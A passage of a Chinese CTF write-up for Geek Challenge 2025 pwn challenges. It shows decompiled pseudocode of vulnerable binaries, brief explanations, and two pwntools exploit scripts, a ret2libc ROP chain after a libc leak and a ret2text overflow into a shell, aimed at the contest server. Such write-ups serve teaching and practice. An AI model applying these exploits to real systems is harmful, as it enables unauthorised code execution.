</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">13</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">puts</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Registration successful.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">submit_feedback</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Please register first.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">input</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">input</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">_BYTE</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Please enter your feedback:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Feedback submitted.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>没有后门函数，打libc，先泄露libc基址，在view_resources里，当用户状态是管理员时可以write(1, (char <em>)ptr + 56, 8uLL); 但这个地方事实上存着</em>((_QWORD <em>)ptr + 7) = &amp;puts;也就是puts的地址，在注册时，</em>((_DWORD *)ptr + 13) = 1;存着注册状态，如果此处不为0，则是普通用户，修改为0即可，在read(0, (char *)ptr + 16, 0x28uLL);明显可以覆盖到注册状态,然后计算libc基址打libc即可</p>
<h4 id="exp-3">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1"># context(arch=&#39;amd64&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;geek.ctfplus.cn&#39;</span><span class="p">,</span><span class="mi">32070</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_addr</span> <span class="o">=</span> <span class="mh">0x000000000002a3e5</span>
</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x0000000000029cd6</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your choice &gt;&gt;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;name:&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">password_payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">31</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;password:&#39;</span><span class="p">,</span> <span class="n">password_payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your choice &gt;&gt;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;password:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">31</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;ADMINISTRATOR.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Leaked puts address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rdi_addr</span>
</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">ret_addr</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;system address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;/bin/sh address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;pop rdi; ret address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ret address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="次元囚笼">次元囚笼
</h3><h4 id="解题流程-4">解题流程
</h4><p>查保护
<img src="/p/geek-challenge-2025-wp/image-3.png"
	width="466"
	height="232"
	srcset="/p/geek-challenge-2025-wp/image-3_hu_15f2daf5647b29ba.png 480w, /p/geek-challenge-2025-wp/image-3_hu_c5e8eb4c797c734a.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="200"
		data-flex-basis="482px"
	
>
查伪代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">Input</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">menu</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">Input</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">love_me</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">Input</span> <span class="o">&lt;=</span> <span class="mi">3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">Input</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">miss_me</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">Input</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">abandon_me</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">love_me</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;give me your love &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x32uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">abandon_me</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">_BYTE</span> <span class="n">buf</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-200h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Is this necessary? That&#39;s my prayer&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x200uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">leave</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">leave</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">dest</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-20h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">strcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="s">&#34;love&#34;</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;it&#39;s all of you&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;yes I wait for you forever&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">Backdoor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;I know you pretend to love me , but this&#39;s enough&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;I leave something you want,and Farewell&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>有后门函数，但没有直接的溢出，但love_me输入到buffer可以在leave处被复制到dest上产生溢出，直接ret2text即可</p>
<h4 id="exp-4">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./cyql&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;geek.ctfplus.cn&#39;</span><span class="p">,</span><span class="mi">32015</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">backdoor_addr</span> <span class="o">=</span> <span class="mh">0x00000000004012D9</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cin &gt;&gt; :&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;give me your love&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cin &gt;&gt; :&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Is this necessary? That</span><span class="se">\&#39;</span><span class="s1">s my prayer&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">512</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="mission-transponder">Mission Transponder
</h3><h4 id="解题流程-5">解题流程
</h4><p>查保护
<img src="/p/geek-challenge-2025-wp/image-10.png"
	width="423"
	height="165"
	srcset="/p/geek-challenge-2025-wp/image-10_hu_4b978d0ea6a195b3.png 480w, /p/geek-challenge-2025-wp/image-10_hu_f29722239841ff54.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="256"
		data-flex-basis="615px"
	
>
查伪代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">tip</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">repeater</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
